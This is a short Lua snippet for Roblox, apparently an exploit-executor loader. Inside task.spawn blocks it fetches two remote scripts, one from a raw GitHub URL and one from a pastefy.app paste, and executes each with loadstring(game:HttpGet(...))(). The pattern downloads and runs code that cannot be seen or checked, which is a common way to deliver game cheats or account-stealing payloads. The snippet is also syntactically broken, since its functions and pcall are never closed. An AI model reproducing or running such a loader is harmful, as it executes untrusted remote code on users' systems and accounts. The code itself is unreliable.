-- Run additional scripts concurrently
pcall(function()
    -- Script with delay to reduce freezing
    task.spawn(function()
        task.wait(8)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))()
    -- Script that runs immediately
    task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/fHJbns7j/raw"))()


